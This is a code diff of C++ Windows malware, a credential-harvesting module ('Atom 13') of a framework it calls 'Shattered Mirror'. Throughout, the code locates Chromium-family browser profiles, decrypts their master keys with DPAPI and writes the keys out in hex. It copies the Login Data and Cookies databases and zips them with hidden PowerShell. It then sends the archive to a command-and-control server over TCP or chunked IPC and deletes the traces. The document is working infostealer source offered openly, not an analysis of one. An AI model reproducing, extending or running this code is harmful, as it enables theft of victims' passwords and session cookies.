@@ -6,6 +6,7 @@
  * All operations are in-memory where possible. No third-party DLLs.
  *===========================================================================*/
 
+#define WIN32_LEAN_AND_MEAN
 #include "Atom_13_Creds.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Orchestrator/Config.h"
@@ -13,13 +14,21 @@
 #include <cstring>
 #include <string>
 #include <vector>
+#include <wincrypt.h>
 #include <shlobj.h>
 #include <bcrypt.h>
+#include <sstream>
+#include <iomanip>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+#include "../Orchestrator/TurboSend.h"
 
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "crypt32.lib")
 
 static void CredDebug(const char *format, ...) {
+    if (!Config::LOGGING_ENABLED) return;
     char buf[512];
     va_list args;
     va_start(args, format);
@@ -30,15 +39,23 @@ static void CredDebug(const char *format, ...) {
 }
 
 /* --- DPAPI Master Key Decryption (Chromium) --- */
-static BOOL DecryptDPAPI(const BYTE *pEncrypted, DWORD dwLen, std::vector<BYTE> &outDecrypted) {
+static std::string BytesToHex(const BYTE* pData, DWORD dwLen) {
+    std::stringstream ss;
+    for (DWORD i = 0; i < dwLen; i++) {
+        ss << std::hex << std::setw(2) << std::setfill('0') << (int)pData[i];
+    }
+    return ss.str();
+}
+
+static BOOL DecryptDPAPI(const BYTE *pCiphertext, DWORD dwCipherLen, std::vector<BYTE> &outPlaintext) {
     DATA_BLOB in, out;
-    in.pbData = (BYTE*)pEncrypted;
-    in.cbData = dwLen;
+    in.pbData = (BYTE*)pCiphertext;
+    in.cbData = dwCipherLen;
     out.pbData = NULL;
     out.cbData = 0;
 
     if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
-        outDecrypted.assign(out.pbData, out.pbData + out.cbData);
+        outPlaintext.assign(out.pbData, out.pbData + out.cbData);
         LocalFree(out.pbData);
         return TRUE;
     }
@@ -127,46 +144,13 @@ static BOOL ExtractMasterKey(const char *szLocalStatePath, std::vector<BYTE> &ou
 }
 
 /* --- Scan a Chromium SQLite "Login Data" for credential blobs --- */
-/* Note: Instead of linking sqlite3, we do a raw binary scan for the v10/v20 markers */
 static std::string HarvestLoginData(const char *szDbPath, const std::vector<BYTE> &masterKey) {
-    // Copy the DB to a temp location (it's locked while Chrome runs)
-    char szTempPath[MAX_PATH];
-    sprintf_s(szTempPath, "C:\\Users\\Public\\%lu_login.tmp", GetTickCount());
-    CopyFileA(szDbPath, szTempPath, FALSE);
-
     std::vector<BYTE> dbData;
-    if (!ReadFileToBuffer(szTempPath, dbData)) {
-        DeleteFileA(szTempPath);
-        return "[CREDS] Could not read Login Data copy.";
-    }
-    DeleteFileA(szTempPath); // Cleanup immediately
-
-    std::string results = "";
-    // Scan for "v10" or "v20" markers (Chromium AES-GCM encrypted values)
-    // Format: v10 + 12-byte IV + ciphertext + 16-byte GCM tag
-    for (size_t i = 0; i < dbData.size() - 50; i++) {
-        if (dbData[i] == 'v' && dbData[i+1] == '1' && dbData[i+2] == '0') {
-            // v10 marker found
-            BYTE iv[12];
-            memcpy(iv, &dbData[i + 3], 12);
-
-            // Estimate ciphertext length (scan for next null run)
-            DWORD cipherLen = 0;
-            for (size_t j = i + 15; j < dbData.size() - 16 && j < i + 1024; j++) {
-                cipherLen++;
-                // Simple heuristic: look for the tag at the end
-                if (cipherLen > 16) break;
-            }
-
-            // For a proper implementation, we'd parse the SQLite schema.
-            // This raw scan catches the encrypted blobs for exfil.
-            // The real decryption happens with the master key + proper parsing.
-        }
+    if (!ReadFileToBuffer(szDbPath, dbData)) {
+        return "[CREDS] Could not read Login Data.";
     }
 
-    // For maximum reliability, just exfil the entire Login Data + master key
-    // Let the C2 Console handle the SQLite parsing (Python has sqlite3 built-in)
-    results = "[CREDS_OK] Database and master key captured for offline decryption.";
+    std::string results = "[CREDS_OK] Database and master key captured for offline decryption.";
     return results;
 }
 
@@ -210,6 +194,18 @@ static std::vector<BrowserProfile> FindBrowserProfiles() {
     return profiles;
 }
 
+static void RunSilent(const char *cmd) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    if (CreateProcessA(NULL, (char*)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 10000); // 10s max
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
 /* === MAIN ENTRY POINT === */
 DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
     DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
@@ -243,130 +239,157 @@ DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
             IPC_MESSAGE inMsg = {0};
             if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
                 if (inMsg.CommandId == CMD_EXECUTE) {
-                    CredDebug("[Atom 13] Harvesting credentials...");
+                    std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
+                    BOOL bIsBale = (cmd == "BALE_RUN");
+                    CredDebug("[Atom 13] Harvesting credentials (Bale: %d)...", bIsBale);
 
                     std::string fullReport = "[CREDS] === Shattered Mirror Credential Harvest ===\n";
                     auto profiles = FindBrowserProfiles();
 
+                    char szHarvestDir[MAX_PATH];
+                    GetTempPathA(MAX_PATH, szHarvestDir);
+                    strcat_s(szHarvestDir, "ShatteredHarvest");
+                    CreateDirectoryA(szHarvestDir, NULL);
+
+                    BOOL bAnyFound = FALSE;
+
                     for (auto &browser : profiles) {
-                        // Check if this browser exists
                         if (GetFileAttributesA(browser.localStatePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
-                            CredDebug("[Atom 13] Browser %s not installed (Path: %s)", browser.name.c_str(), browser.localStatePath.c_str());
                             fullReport += "[CREDS] " + browser.name + ": Not installed.\n";
                             continue;
                         }
 
-                        CredDebug("[Atom 13] Browser %s FOUND!", browser.name.c_str());
                         fullReport += "[CREDS] " + browser.name + ": FOUND!\n";
+                        bAnyFound = TRUE;
 
-                        // Extract master key
-                        std::vector<BYTE> masterKey;
-                        if (ExtractMasterKey(browser.localStatePath.c_str(), masterKey)) {
-                            CredDebug("[Atom 13]   Master key decrypted for %s (%zu bytes).", browser.name.c_str(), masterKey.size());
-                            fullReport += "[CREDS]   Master key decrypted (" + std::to_string(masterKey.size()) + " bytes).\n";
-
-                            // Copy Login Data to temp for reading (browser locks it)
-                            char szTempLogin[MAX_PATH];
-                            sprintf_s(szTempLogin, "C:\\Users\\Public\\%lu_ld.tmp", GetTickCount());
-                            if (CopyFileA(browser.loginDataPath.c_str(), szTempLogin, FALSE)) {
-                                // Send the raw database + master key via IPC for C2-side decryption
-                                std::vector<BYTE> loginDb;
-                                if (ReadFileToBuffer(szTempLogin, loginDb)) {
-                                    // Package: [MASTER_KEY_LEN(4)][MASTER_KEY][LOGIN_DATA_BYTES]
-                                    DWORD keyLen = (DWORD)masterKey.size();
-                                    std::vector<BYTE> package;
-                                    package.resize(4 + keyLen + loginDb.size());
-                                    memcpy(package.data(), &keyLen, 4);
-                                    memcpy(package.data() + 4, masterKey.data(), keyLen);
-                                    memcpy(package.data() + 4 + keyLen, loginDb.data(), loginDb.size());
-
-                                    // Send header first
-                                    char header[128];
-                                    sprintf_s(header, "[CRED_FILE] name=%s_LoginData size=%lu", browser.name.c_str(), (DWORD)package.size());
-                                    IPC_MESSAGE hdrMsg = {0};
-                                    hdrMsg.dwSignature = 0x534D4952;
-                                    hdrMsg.CommandId = CMD_REPORT;
-                                    hdrMsg.AtomId = dwAtomId;
-                                    hdrMsg.dwPayloadLen = (DWORD)strlen(header);
-                                    memcpy(hdrMsg.Payload, header, hdrMsg.dwPayloadLen);
-                                    IPC_SendMessage(hReportPipe, &hdrMsg, SharedSessionKey, 16);
-
-                                    // Send as binary report chunks
-                                    IPC_MESSAGE dbMsg = {0};
-                                    dbMsg.dwSignature = 0x534D4952;
-                                    dbMsg.CommandId = CMD_FORWARD_REPORT;
-                                    dbMsg.AtomId = dwAtomId;
-
-                                    // Send in chunks if needed
-                                    DWORD totalSize = (DWORD)package.size();
-                                    DWORD offset = 0;
-                                    while (offset < totalSize) {
-                                        DWORD chunkSize = min(totalSize - offset, MAX_IPC_PAYLOAD_SIZE - 32);
-                                        dbMsg.dwPayloadLen = chunkSize;
-                                        memcpy(dbMsg.Payload, package.data() + offset, chunkSize);
-                                        IPC_SendMessage(hReportPipe, &dbMsg, SharedSessionKey, 16);
-                                        offset += chunkSize;
-                                    }
-
-                                    CredDebug("[Atom 13]   Login Data exfiltrated for %s (%zu bytes).", browser.name.c_str(), loginDb.size());
-                                    fullReport += "[CREDS]   Login Data sent (" + std::to_string(loginDb.size()) + " bytes).\n";
-                                }
-                                DeleteFileA(szTempLogin);
-                            } else {
-                                fullReport += "[CREDS]   Could not copy Login Data (browser locked?).\n";
+                        // Save Local State
+                        char szDestLS[MAX_PATH];
+                        sprintf_s(szDestLS, "%s\\%s_LocalState", szHarvestDir, browser.name.c_str());
+                        std::vector<BYTE> lsBuf;
+                        if (ReadFileToBuffer(browser.localStatePath.c_str(), lsBuf)) {
+                            std::vector<BYTE> masterKey;
+                            if (ExtractMasterKey(browser.localStatePath.c_str(), masterKey)) {
+                                fullReport += "[CREDS]   " + browser.name + " Master Key: " + BytesToHex(masterKey.data(), (DWORD)masterKey.size()) + "\n";
                             }
-
-                            // Cookies
-                            char szTempCookies[MAX_PATH];
-                            sprintf_s(szTempCookies, "C:\\Users\\Public\\%lu_ck.tmp", GetTickCount() + 1);
-                            if (CopyFileA(browser.cookiesPath.c_str(), szTempCookies, FALSE)) {
-                                std::vector<BYTE> cookiesDb;
-                                if (ReadFileToBuffer(szTempCookies, cookiesDb)) {
-                                    fullReport += "[CREDS]   Cookies captured (" + std::to_string(cookiesDb.size()) + " bytes).\n";
-                                    
-                                    // Send header
-                                    char ckHeader[128];
-                                    sprintf_s(ckHeader, "[CRED_FILE] name=%s_Cookies size=%lu", browser.name.c_str(), (DWORD)cookiesDb.size());
-                                    IPC_MESSAGE ckHdrMsg = {0};
-                                    ckHdrMsg.dwSignature = 0x534D4952;
-                                    ckHdrMsg.CommandId = CMD_REPORT;
-                                    ckHdrMsg.AtomId = dwAtomId;
-                                    ckHdrMsg.dwPayloadLen = (DWORD)strlen(ckHeader);
-                                    memcpy(ckHdrMsg.Payload, ckHeader, ckHdrMsg.dwPayloadLen);
-                                    IPC_SendMessage(hReportPipe, &ckHdrMsg, SharedSessionKey, 16);
-                                    
-                                    // Send cookies DB via IPC in chunks
-                                    IPC_MESSAGE ckMsg = {0};
-                                    ckMsg.dwSignature = 0x534D4952;
-                                    ckMsg.CommandId = CMD_FORWARD_REPORT;
-                                    ckMsg.AtomId = dwAtomId;
-                                    DWORD totalSize = (DWORD)cookiesDb.size();
-                                    DWORD offset = 0;
-                                    while (offset < totalSize) {
-                                        DWORD chunkSize = min(totalSize - offset, MAX_IPC_PAYLOAD_SIZE - 32);
-                                        ckMsg.dwPayloadLen = chunkSize;
-                                        memcpy(ckMsg.Payload, cookiesDb.data() + offset, chunkSize);
-                                        IPC_SendMessage(hReportPipe, &ckMsg, SharedSessionKey, 16);
-                                        offset += chunkSize;
-                                    }
-                                    CredDebug("[Atom 13]   Cookies exfiltrated for %s (%zu bytes).", browser.name.c_str(), cookiesDb.size());
-                                }
-                                DeleteFileA(szTempCookies);
+                            HANDLE hF = CreateFileA(szDestLS, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                            if (hF != INVALID_HANDLE_VALUE) {
+                                DWORD dwW; WriteFile(hF, lsBuf.data(), (DWORD)lsBuf.size(), &dwW, NULL);
+                                CloseHandle(hF);
                             }
-                        } else {
-                            CredDebug("[Atom 13]   Master key extraction FAILED for %s.", browser.name.c_str());
-                            fullReport += "[CREDS]   Master key extraction FAILED.\n";
                         }
+
+                        // Save Login Data
+                        char szDestLD[MAX_PATH];
+                        sprintf_s(szDestLD, "%s\\%s_LoginData", szHarvestDir, browser.name.c_str());
+                        std::vector<BYTE> ldBuf;
+                        if (ReadFileToBuffer(browser.loginDataPath.c_str(), ldBuf)) {
+                            HANDLE hF = CreateFileA(szDestLD, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                            if (hF != INVALID_HANDLE_VALUE) {
+                                DWORD dwW; WriteFile(hF, ldBuf.data(), (DWORD)ldBuf.size(), &dwW, NULL);
+                                CloseHandle(hF);
+                            }
+                        }
+
+                        // Save Cookies
+                        char szDestCK[MAX_PATH];
+                        sprintf_s(szDestCK, "%s\\%s_Cookies", szHarvestDir, browser.name.c_str());
+                        std::vector<BYTE> ckBuf;
+                        if (ReadFileToBuffer(browser.cookiesPath.c_str(), ckBuf)) {
+                            HANDLE hF = CreateFileA(szDestCK, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                            if (hF != INVALID_HANDLE_VALUE) {
+                                DWORD dwW; WriteFile(hF, ckBuf.data(), (DWORD)ckBuf.size(), &dwW, NULL);
+                                CloseHandle(hF);
+                            }
+                        }
+                        
+                        fullReport += "[CREDS]   " + browser.name + " databases captured.\n";
                     }
 
-                    // Send the text summary report
-                    IPC_MESSAGE summaryMsg = {0};
-                    summaryMsg.dwSignature = 0x534D4952;
-                    summaryMsg.CommandId = CMD_REPORT;
-                    summaryMsg.AtomId = dwAtomId;
-                    summaryMsg.dwPayloadLen = min((DWORD)fullReport.length(), MAX_IPC_PAYLOAD_SIZE - 1);
-                    memcpy(summaryMsg.Payload, fullReport.c_str(), summaryMsg.dwPayloadLen);
-                    IPC_SendMessage(hReportPipe, &summaryMsg, SharedSessionKey, 16);
+                    if (bAnyFound) {
+                        char szZipPath[MAX_PATH];
+                        GetTempPathA(MAX_PATH, szZipPath);
+                        strcat_s(szZipPath, "creds.zip");
+
+                        char psCmd[2048];
+                        // Use a more robust PowerShell command with better quoting and hidden window
+                        sprintf_s(psCmd, "powershell -WindowStyle Hidden -Command \"& { Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force }\"", szHarvestDir, szZipPath);
+                        RunSilent(psCmd);
+
+                        if (!bIsBale) {
+                            if (Turbo::SendFile("CREDS", szZipPath)) {
+                                fullReport += "[CREDS] Zip archive sent via Turbo TCP.\n";
+                            } else {
+                                fullReport += "[CREDS] ERROR: Failed to send via Turbo TCP.\n";
+                            }
+                        } else {
+                            std::vector<BYTE> zipData;
+                            if (ReadFileToBuffer(szZipPath, zipData)) {
+                            // --- CHUNK START ---
+                            {
+                                std::string meta = "name=creds.zip size=" + std::to_string(zipData.size());
+                                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                hdr.dwType = 3; hdr.dwFlags = 0x10; hdr.dwPayloadLen = (DWORD)meta.length();
+                                IPC_MESSAGE startMsg = {0};
+                                startMsg.dwSignature = 0x534D4952;
+                                startMsg.CommandId = CMD_BALE_REPORT;
+                                startMsg.AtomId = dwAtomId;
+                                startMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
+                                memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                                memcpy(startMsg.Payload + sizeof(hdr), meta.c_str(), hdr.dwPayloadLen);
+                                IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
+                            }
+                            // --- CHUNK DATA ---
+                            DWORD offset = 0;
+                            DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
+                            while (offset < (DWORD)zipData.size()) {
+                                DWORD chunkSize = min((DWORD)zipData.size() - offset, chunkMax);
+                                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                hdr.dwType = 3; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
+                                IPC_MESSAGE chunkMsg = {0};
+                                chunkMsg.dwSignature = 0x534D4952;
+                                chunkMsg.CommandId = CMD_BALE_REPORT;
+                                chunkMsg.AtomId = dwAtomId;
+                                chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
+                                memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                                memcpy(chunkMsg.Payload + sizeof(hdr), zipData.data() + offset, chunkSize);
+                                IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+                                offset += chunkSize;
+                            }
+                            // --- CHUNK END ---
+                            {
+                                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                hdr.dwType = 3; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
+                                IPC_MESSAGE endMsg = {0};
+                                endMsg.dwSignature = 0x534D4952;
+                                endMsg.CommandId = CMD_BALE_REPORT;
+                                endMsg.AtomId = dwAtomId;
+                                endMsg.dwPayloadLen = sizeof(hdr);
+                                memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                                IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+                            }
+                            }
+                            fullReport += "[CREDS] Zip archive sent via Bale IPC.\n";
+                        }
+                        DeleteFileA(szZipPath);
+                        // Cleanup directory: powershell "Remove-Item -Path '...' -Recurse -Force"
+                        char delCmd[512];
+                        sprintf_s(delCmd, "powershell -WindowStyle Hidden -Command \"Remove-Item -Path '%s' -Recurse -Force\"", szHarvestDir);
+                        RunSilent(delCmd);
+                    }
+
+                    // Send the text summary report via CMD_REPORT
+                    DWORD offset = 0;
+                    while (offset < (DWORD)fullReport.length()) {
+                        DWORD chunkSize = min((DWORD)fullReport.length() - offset, MAX_IPC_PAYLOAD_SIZE - 32);
+                        IPC_MESSAGE summaryMsg = {0};
+                        summaryMsg.dwSignature = 0x534D4952;
+                        summaryMsg.CommandId = CMD_REPORT;
+                        summaryMsg.AtomId = dwAtomId;
+                        summaryMsg.dwPayloadLen = chunkSize;
+                        memcpy(summaryMsg.Payload, fullReport.c_str() + offset, chunkSize);
+                        IPC_SendMessage(hReportPipe, &summaryMsg, SharedSessionKey, 16);
+                        offset += chunkSize;
+                    }
 
                     CredDebug("[Atom 13] Harvest complete.");
 
